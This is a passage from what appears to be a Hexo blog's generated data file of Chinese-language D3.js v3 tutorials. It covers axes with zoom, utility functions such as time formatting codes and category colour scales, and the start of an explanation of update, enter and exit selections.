class=\"string\">`translate(<span class=\"subst\">$&#123;padding&#125;</span>, <span class=\"subst\">$&#123;padding&#125;</span>)`</span>)</span></span><br><span class=\"line\">            .call(yAxis);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        svg.select(<span class=\"string\">&#x27;.rect-background&#x27;</span>).call(zoom);</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"坐标轴\"><a href=\"#坐标轴\" class=\"headerlink\" title=\"坐标轴\"></a>坐标轴</h1><p>说明：使用 <code>let axis = d3.svg.axis()</code> 生成坐标轴</p>\n<blockquote>\n<p>坐标轴上所有的文字、线段都以轴最外面的元素 <code>g</code> 为标准进行布局，并设置 <code>g</code> 元素的 <code>transform: tanslate(x, y)</code>（如果没有 <code>g</code> 元素，则会以根元素 <code>svg</code> 为标准）</p>\n</blockquote>\n<ul>\n<li><code>axis(selection)</code>： 将轴绘制在选择集上，一般是添加到 <code>g</code> 元素上，与 <code>selection.call(axis)</code> 的功能一样</li>\n<li><code>axis.orient(orientation)</code>： orientation 参数设置坐标轴方向 ，并返回轴（可选值为 <code>bottom</code>、<code>top</code>、<code>left</code>、<code>right</code>，默认为 <code>bottom</code>）</li>\n<li><code>axis.tickValues(arr)</code>: 指定的数值将用于刻度中的文本</li>\n<li><code>axis.ticks(num)</code>：num 参数设置或获取（当参数为空时）坐标轴刻度的个数</li>\n<li><code>axis.innerTickSize(size)</code>：size 参数设置或获取（当参数为空时）内部坐标轴刻度线的长度（px）</li>\n<li><code>axis.outerTickSize(size)</code>：size 参数设置或获取（当参数为空时）外部坐标轴刻度线的长度（px）</li>\n<li><code>axis.tickSize(inner, outer)</code>：设定或获取坐标轴内外刻度线的长度</li>\n<li><code>axis.tickPadding(padding)</code>: padding 参数设置刻度线与文本间的距离 </li>\n<li><code>axis.tickFormat(fn)</code>: 格式化显示在坐标轴上的数据 </li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;viewport&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">&quot;X-UA-Compatible&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>D3.js - 坐标轴<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">        .container &#123;</span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">border</span>: <span class=\"number\">1px</span> solid <span class=\"number\">#999</span>;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        .rect-background &#123;</span><br><span class=\"line\"><span class=\"css\">            fill: <span class=\"number\">#ddd</span>;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        .axis path &#123;</span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">display</span>: none;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        .axis line &#123;</span><br><span class=\"line\"><span class=\"css\">            fill: none;</span></span><br><span class=\"line\"><span class=\"css\">            stroke: <span class=\"number\">#fff</span>;</span></span><br><span class=\"line\"><span class=\"css\">            shape-rendering: crispEdges;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        .axis text &#123;</span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">font-family</span>: sans-serif;</span></span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">font-size</span>: <span class=\"number\">12px</span>;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://d3js.org/d3.v3.js&quot;</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> w = <span class=\"number\">960</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> h = <span class=\"number\">600</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> padding = <span class=\"number\">40</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> xData = [-<span class=\"number\">450</span>, <span class=\"number\">450</span>];</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> yData = [-<span class=\"number\">250</span>, <span class=\"number\">250</span>];</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> svg = d3.select(<span class=\"string\">&#x27;body&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .append(<span class=\"string\">&#x27;svg&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;container&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;width&#x27;</span>, w)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;height&#x27;</span>, h);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> xScale = d3.scale.linear()</span></span><br><span class=\"line\">            .domain(xData)</span><br><span class=\"line\">            .range([0, w - padding * 2]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> yScale = d3.scale.linear()</span></span><br><span class=\"line\">            .domain(yData)</span><br><span class=\"line\">            .range([0, h - padding * 2]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> xAxis = d3.svg.axis()</span></span><br><span class=\"line\">            .scale(xScale)</span><br><span class=\"line\"><span class=\"javascript\">            .orient(<span class=\"string\">&#x27;bottom&#x27;</span>)</span></span><br><span class=\"line\">            .tickSize(-h);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> yAxis = d3.svg.axis()</span></span><br><span class=\"line\">            .scale(yScale)</span><br><span class=\"line\"><span class=\"javascript\">            .orient(<span class=\"string\">&#x27;left&#x27;</span>)</span></span><br><span class=\"line\">            .tickSize(-w)</span><br><span class=\"line\">            .ticks(5);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">zoomed</span>(<span class=\"params\"></span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            svg.select(<span class=\"string\">&#x27;.x-axis&#x27;</span>).call(xAxis);</span></span><br><span class=\"line\"><span class=\"javascript\">            svg.select(<span class=\"string\">&#x27;.y-axis&#x27;</span>).call(yAxis);</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> zoom = d3.behavior.zoom()</span></span><br><span class=\"line\">            .x(xScale)</span><br><span class=\"line\">            .y(yScale)</span><br><span class=\"line\">            .scaleExtent([1, 3])</span><br><span class=\"line\"><span class=\"javascript\">            .on(<span class=\"string\">&#x27;zoom&#x27;</span>, zoomed);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        svg.append(<span class=\"string\">&#x27;g&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;transform&#x27;</span>, <span class=\"string\">`translate(<span class=\"subst\">$&#123;padding&#125;</span>, <span class=\"subst\">$&#123;padding&#125;</span>)`</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .append(<span class=\"string\">&#x27;rect&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;rect-background&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;width&#x27;</span>, w - padding * <span class=\"number\">2</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;height&#x27;</span>, h - padding * <span class=\"number\">2</span>);</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        svg.append(<span class=\"string\">&#x27;g&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;axis x-axis&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;transform&#x27;</span>, <span class=\"string\">`translate(<span class=\"subst\">$&#123;padding&#125;</span>, <span class=\"subst\">$&#123;h - padding&#125;</span>)`</span>)</span></span><br><span class=\"line\">            .call(xAxis);</span><br><span class=\"line\">            </span><br><span class=\"line\"><span class=\"javascript\">        svg.append(<span class=\"string\">&#x27;g&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;axis y-axis&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;transform&#x27;</span>, <span class=\"string\">`translate(<span class=\"subst\">$&#123;padding&#125;</span>, <span class=\"subst\">$&#123;padding&#125;</span>)`</span>)</span></span><br><span class=\"line\">            .call(yAxis);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        svg.select(<span class=\"string\">&#x27;.rect-background&#x27;</span>).call(zoom);</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>"},{"title":"工具函数","date":"2021-03-23T16:00:00.000Z","_content":"\n# 工具函数\n\n### 数组\n* d3.range([start, ]stop[, step]): 生成一个包含算数级数的数组\n* d3.shuffle(): 随机化一个数组的顺序\n* d3.sum(): 计算数字数组的和\n\n### 时间格式化 `d3.time.format`\n\n```js\nvar date = new Date();\nvar formatter = d3.time.format('%Y-%m-%d %H:%M:%S');\nformatter(date); // 2018-01-26 16:38:05\n```\n\n%j：在本年中的天数 [001, 366] \n%y：不含纪元的年份 [00, 99] \n%Y：包含纪年的4位数年份\n%d：在本月的天数， 不足2位用0补全 [01, 31] \n%e：在本月的天数， 不足2位用空格补全 [ 1, 31]\n%m：月份 [01, 12] \n%b：月的缩写 // Jan \n%B：月的全称 // January\n%H：小时， 24小时制 [00, 23] \n%I：小时， 12小时制 [01, 12]\n%M：分钟 [00, 59] \n%S：秒 [00, 60] \n%L：毫秒 [000, 999] \n%a：星期的缩写 // Thu \n%A：星期的全称 // Thursday\n%p：AM或PM \n%x：日期部分， 等同于 `%m%d%Y` \n%X：时间部分， 等同于 `%H:%M:%S` \n\n### 颜色序数比例尺 `d3.scale.category10`\n\n构造一个新的序数比例尺，使用以下 10（20）种颜色\n\n* d3.scale.category10()\n* d3.scale.category20()\n* d3.scale.category20b()\n* d3.scale.category20c()\n\n说明：该比例尺有默认的值域包含 10 中颜色，但并没有设置范围域。传递给比例尺函数的每个唯一值将从输出范围中分配一个新值。\n\n```js\nvar scale = d3.scale.category10();\nscale(0); // #1f77b4\nscale(1); // #ff7f0e\nscale(10); // #2ca02c\nscale.domain(); // [0, 1, 10]\nscale(10); // #2ca02c\nscale(15); // #d62728\nscale.domain(); // [0, 1, 10, 15]\nscale.range(); // [\"#1f77b4\", \"#ff7f0e\", \"#2ca02c\", \"#d62728\", \"#9467bd\", \"#8c564b\", \"#e377c2\", \"#7f7f7f\", \"#bcbd22\", \"#17becf\"]\n```\n\n","source":"_posts/D3.js/工具函数.md","raw":"---\ntitle: 工具函数\ncategories: [D3.js]\ntags: [D3.js]\ndate: 2021-03-24\n---\n\n# 工具函数\n\n### 数组\n* d3.range([start, ]stop[, step]): 生成一个包含算数级数的数组\n* d3.shuffle(): 随机化一个数组的顺序\n* d3.sum(): 计算数字数组的和\n\n### 时间格式化 `d3.time.format`\n\n```js\nvar date = new Date();\nvar formatter = d3.time.format('%Y-%m-%d %H:%M:%S');\nformatter(date); // 2018-01-26 16:38:05\n```\n\n%j：在本年中的天数 [001, 366] \n%y：不含纪元的年份 [00, 99] \n%Y：包含纪年的4位数年份\n%d：在本月的天数， 不足2位用0补全 [01, 31] \n%e：在本月的天数， 不足2位用空格补全 [ 1, 31]\n%m：月份 [01, 12] \n%b：月的缩写 // Jan \n%B：月的全称 // January\n%H：小时， 24小时制 [00, 23] \n%I：小时， 12小时制 [01, 12]\n%M：分钟 [00, 59] \n%S：秒 [00, 60] \n%L：毫秒 [000, 999] \n%a：星期的缩写 // Thu \n%A：星期的全称 // Thursday\n%p：AM或PM \n%x：日期部分， 等同于 `%m%d%Y` \n%X：时间部分， 等同于 `%H:%M:%S` \n\n### 颜色序数比例尺 `d3.scale.category10`\n\n构造一个新的序数比例尺，使用以下 10（20）种颜色\n\n* d3.scale.category10()\n* d3.scale.category20()\n* d3.scale.category20b()\n* d3.scale.category20c()\n\n说明：该比例尺有默认的值域包含 10 中颜色，但并没有设置范围域。传递给比例尺函数的每个唯一值将从输出范围中分配一个新值。\n\n```js\nvar scale = d3.scale.category10();\nscale(0); // #1f77b4\nscale(1); // #ff7f0e\nscale(10); // #2ca02c\nscale.domain(); // [0, 1, 10]\nscale(10); // #2ca02c\nscale(15); // #d62728\nscale.domain(); // [0, 1, 10, 15]\nscale.range(); // [\"#1f77b4\", \"#ff7f0e\", \"#2ca02c\", \"#d62728\", \"#9467bd\", \"#8c564b\", \"#e377c2\", \"#7f7f7f\", \"#bcbd22\", \"#17becf\"]\n```\n\n","slug":"D3.js/工具函数","published":1,"updated":"2021-04-28T02:30:58.469Z","_id":"cko0u126o0002y26rhjen63xs","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"工具函数\"><a href=\"#工具函数\" class=\"headerlink\" title=\"工具函数\"></a>工具函数</h1><h3 id=\"数组\"><a href=\"#数组\" class=\"headerlink\" title=\"数组\"></a>数组</h3><ul>\n<li>d3.range([start, ]stop[, step]): 生成一个包含算数级数的数组</li>\n<li>d3.shuffle(): 随机化一个数组的顺序</li>\n<li>d3.sum(): 计算数字数组的和</li>\n</ul>\n<h3 id=\"时间格式化-d3-time-format\"><a href=\"#时间格式化-d3-time-format\" class=\"headerlink\" title=\"时间格式化 d3.time.format\"></a>时间格式化 <code>d3.time.format</code></h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> date = <span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>();</span><br><span class=\"line\"><span class=\"keyword\">var</span> formatter = d3.time.format(<span class=\"string\">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>);</span><br><span class=\"line\">formatter(date); <span class=\"comment\">// 2018-01-26 16:38:05</span></span><br></pre></td></tr></table></figure>\n\n<p>%j：在本年中的天数 [001, 366]<br>%y：不含纪元的年份 [00, 99]<br>%Y：包含纪年的4位数年份<br>%d：在本月的天数， 不足2位用0补全 [01, 31]<br>%e：在本月的天数， 不足2位用空格补全 [ 1, 31]<br>%m：月份 [01, 12]<br>%b：月的缩写 // Jan<br>%B：月的全称 // January<br>%H：小时， 24小时制 [00, 23]<br>%I：小时， 12小时制 [01, 12]<br>%M：分钟 [00, 59]<br>%S：秒 [00, 60]<br>%L：毫秒 [000, 999]<br>%a：星期的缩写 // Thu<br>%A：星期的全称 // Thursday<br>%p：AM或PM<br>%x：日期部分， 等同于 <code>%m%d%Y</code><br>%X：时间部分， 等同于 <code>%H:%M:%S</code> </p>\n<h3 id=\"颜色序数比例尺-d3-scale-category10\"><a href=\"#颜色序数比例尺-d3-scale-category10\" class=\"headerlink\" title=\"颜色序数比例尺 d3.scale.category10\"></a>颜色序数比例尺 <code>d3.scale.category10</code></h3><p>构造一个新的序数比例尺，使用以下 10（20）种颜色</p>\n<ul>\n<li>d3.scale.category10()</li>\n<li>d3.scale.category20()</li>\n<li>d3.scale.category20b()</li>\n<li>d3.scale.category20c()</li>\n</ul>\n<p>说明：该比例尺有默认的值域包含 10 中颜色，但并没有设置范围域。传递给比例尺函数的每个唯一值将从输出范围中分配一个新值。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> scale = d3.scale.category10();</span><br><span class=\"line\">scale(<span class=\"number\">0</span>); <span class=\"comment\">// #1f77b4</span></span><br><span class=\"line\">scale(<span class=\"number\">1</span>); <span class=\"comment\">// #ff7f0e</span></span><br><span class=\"line\">scale(<span class=\"number\">10</span>); <span class=\"comment\">// #2ca02c</span></span><br><span class=\"line\">scale.domain(); <span class=\"comment\">// [0, 1, 10]</span></span><br><span class=\"line\">scale(<span class=\"number\">10</span>); <span class=\"comment\">// #2ca02c</span></span><br><span class=\"line\">scale(<span class=\"number\">15</span>); <span class=\"comment\">// #d62728</span></span><br><span class=\"line\">scale.domain(); <span class=\"comment\">// [0, 1, 10, 15]</span></span><br><span class=\"line\">scale.range(); <span class=\"comment\">// [&quot;#1f77b4&quot;, &quot;#ff7f0e&quot;, &quot;#2ca02c&quot;, &quot;#d62728&quot;, &quot;#9467bd&quot;, &quot;#8c564b&quot;, &quot;#e377c2&quot;, &quot;#7f7f7f&quot;, &quot;#bcbd22&quot;, &quot;#17becf&quot;]</span></span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"工具函数\"><a href=\"#工具函数\" class=\"headerlink\" title=\"工具函数\"></a>工具函数</h1><h3 id=\"数组\"><a href=\"#数组\" class=\"headerlink\" title=\"数组\"></a>数组</h3><ul>\n<li>d3.range([start, ]stop[, step]): 生成一个包含算数级数的数组</li>\n<li>d3.shuffle(): 随机化一个数组的顺序</li>\n<li>d3.sum(): 计算数字数组的和</li>\n</ul>\n<h3 id=\"时间格式化-d3-time-format\"><a href=\"#时间格式化-d3-time-format\" class=\"headerlink\" title=\"时间格式化 d3.time.format\"></a>时间格式化 <code>d3.time.format</code></h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> date = <span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>();</span><br><span class=\"line\"><span class=\"keyword\">var</span> formatter = d3.time.format(<span class=\"string\">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>);</span><br><span class=\"line\">formatter(date); <span class=\"comment\">// 2018-01-26 16:38:05</span></span><br></pre></td></tr></table></figure>\n\n<p>%j：在本年中的天数 [001, 366]<br>%y：不含纪元的年份 [00, 99]<br>%Y：包含纪年的4位数年份<br>%d：在本月的天数， 不足2位用0补全 [01, 31]<br>%e：在本月的天数， 不足2位用空格补全 [ 1, 31]<br>%m：月份 [01, 12]<br>%b：月的缩写 // Jan<br>%B：月的全称 // January<br>%H：小时， 24小时制 [00, 23]<br>%I：小时， 12小时制 [01, 12]<br>%M：分钟 [00, 59]<br>%S：秒 [00, 60]<br>%L：毫秒 [000, 999]<br>%a：星期的缩写 // Thu<br>%A：星期的全称 // Thursday<br>%p：AM或PM<br>%x：日期部分， 等同于 <code>%m%d%Y</code><br>%X：时间部分， 等同于 <code>%H:%M:%S</code> </p>\n<h3 id=\"颜色序数比例尺-d3-scale-category10\"><a href=\"#颜色序数比例尺-d3-scale-category10\" class=\"headerlink\" title=\"颜色序数比例尺 d3.scale.category10\"></a>颜色序数比例尺 <code>d3.scale.category10</code></h3><p>构造一个新的序数比例尺，使用以下 10（20）种颜色</p>\n<ul>\n<li>d3.scale.category10()</li>\n<li>d3.scale.category20()</li>\n<li>d3.scale.category20b()</li>\n<li>d3.scale.category20c()</li>\n</ul>\n<p>说明：该比例尺有默认的值域包含 10 中颜色，但并没有设置范围域。传递给比例尺函数的每个唯一值将从输出范围中分配一个新值。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> scale = d3.scale.category10();</span><br><span class=\"line\">scale(<span class=\"number\">0</span>); <span class=\"comment\">// #1f77b4</span></span><br><span class=\"line\">scale(<span class=\"number\">1</span>); <span class=\"comment\">// #ff7f0e</span></span><br><span class=\"line\">scale(<span class=\"number\">10</span>); <span class=\"comment\">// #2ca02c</span></span><br><span class=\"line\">scale.domain(); <span class=\"comment\">// [0, 1, 10]</span></span><br><span class=\"line\">scale(<span class=\"number\">10</span>); <span class=\"comment\">// #2ca02c</span></span><br><span class=\"line\">scale(<span class=\"number\">15</span>); <span class=\"comment\">// #d62728</span></span><br><span class=\"line\">scale.domain(); <span class=\"comment\">// [0, 1, 10, 15]</span></span><br><span class=\"line\">scale.range(); <span class=\"comment\">// [&quot;#1f77b4&quot;, &quot;#ff7f0e&quot;, &quot;#2ca02c&quot;, &quot;#d62728&quot;, &quot;#9467bd&quot;, &quot;#8c564b&quot;, &quot;#e377c2&quot;, &quot;#7f7f7f&quot;, &quot;#bcbd22&quot;, &quot;#17becf&quot;]</span></span><br></pre></td></tr></table></figure>\n\n"},{"title":"update、enter 与 exit","date":"2021-03-23T16:00:00.000Z","_content":"\n# update、enter 与 exit\n\n作用：处理选择集和数据集关系不确定的情况，对各种选择集分别作处理。\n\n`selection.data()` 操作返回的是三个 Virtual selection，这三个 Virtual selection 是 enter、 update 以及 exit。\n\n假设用三个 `<p>` 元素的选择集（对应的数据分别为 `[0, 1, 2]`），\n\n如果将新数据集 [3, 6, 9, 12, 15] 绑定到选择集上，则前三个数据（3，6，9）有与之对应的元素，这部分成为 `Update`\n而后面两个数据（12，15）没有与之对应的元素，这部分成为 `Enter`\n\n如果将新数据集 `[4, 6]` 绑定到选择集上，则前两个数据（4，6）有与之对应的元素，这部分成为 `Update`\n而原来选择集最后一个数据（2）没有与之对应的元素，这部分成为 `Exit`\n\n\n** update、enter、exit的区别**\n\n`d3.selectAll('text')` 的返回值是一个选择集，返回的是当前 DOM 的信息\n`d3.selectAll('text').data(dataSet)` 的返回值是一个选择集，有 `enter()`、`exit()` 方法，返回的是绑定前后对比的信息\n\n* `update`: 表示在 DOM 中即将被更新的选择集，update 部分的处理办法一般是：**更新属性值**，如 `let updateSelection = svg.selectAll('circle').data(dataSet)`\n* `enter`: 表示在 DOM 中即将被添加的选择集，enter 部分的处理办法一般是：**添加元素后，赋予属性值**，如 `let enterSelection = svg.selectAll('circle').data(dataSet).enter()`\n* `exit`: 表示在 DOM 中即将被删除的选择集，exit 部分的处理办法一般是：**修改属性值，删除元素**，如 `let exitSelection = svg.selectAll('circle').data(dataSet).exit()`\n\n说明：并没有 `svg.selectAll('circle').data(dataSet).update()` 方法，`svg.selectAll('circle').data(dataSet)` 直接返回 Update 选择集（） \n\n> * 比较的是数据集与选择集，而不是比较数据集与选择集中的数据（与 Vue 中的 key 属性、DOM元素复用没有任何联系）\n> * 当有通过数据更新视图时，正确的顺序应该是 `update()` 、`enter()`、`exit()`\n> * 重新将数据绑定到选择集上时，不可能同时存在 `enter()`、`exit()`\n\n对于数组中的数据元素，如果缺少与之对应的 DOM 元素，那么就会有一个占位符来顶替，而 `enter()` 方法返回的就是这些占位符集合的引用。\n这个引用后只能链接 `append()`，`insert()` 以及 `select()` 操作符，通过他们来操作该引用所指向的集合。\n\n### `data()` 数据绑定（`selection.selectAll().data().enter().append()`）\n* `let selectoin = svg.selectAll('circle')` 因为 SVG 容器是空的，返回一个新的空选择 `selection`。 \n* `enterSelectoin = selection.data(dataSet)` 将这个选择连接到一组数据，产生三个新的选择，代表三种可能的状态：`enter`、`update` 和 `exit`。由于选择是空的，所以`update` 和 `exit` 的 `selection` 是空的，而 `enter` 的 `selection` 包含每个新基准的占位符。\n* `selection.data(dataSet)` 返回更新选择，`selection.enter()` 返回 `enter` 选择，而进入和退出选择被挂起 。\n* `enterSelectoin.append()` 将缺失的元素添加到 SVG 容器中，这会为每个数据附加一个新的 `circle` 到 SVG 容器。\n\n> 当把数据分配到一个元素上时，这个数据被存储到该元素的 `_data_` 属性中, 数据可以通过 `_data_` 